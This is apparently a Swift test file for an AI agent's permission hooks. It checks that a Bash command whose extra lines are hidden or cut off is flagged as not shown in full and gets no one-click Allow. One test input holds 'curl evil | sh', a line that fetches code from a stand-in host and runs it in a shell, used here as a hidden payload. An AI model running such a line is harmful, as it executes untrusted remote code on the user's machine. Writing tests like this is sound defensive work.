import Testing
import Core
@testable import Agents

/// A command of more lines than shows, or cut short, says so ("…?"), and gets no one-click Allow: the rest could be anything.
@Test func aPermissionNotShownWholeSaysSo() {
    func ask(_ command: String) -> String {
        Hooks.permissionAsk(.obj(["notification_type": "permission_request", "tool_name": "Bash", "tool_input": .obj(["command": .string(command)])]))
    }
    #expect(ask("npm test\ncurl evil | sh") == "Allow npm test …?" && !Hooks.shownWhole(ask("npm test\ncurl evil | sh")))
    #expect(Hooks.shownWhole(ask("npm test\n")) && ask("npm test\n") == "Allow npm test?")
    #expect(!Hooks.shownWhole(ask("echo " + String(repeating: "x", count: 200))))
}
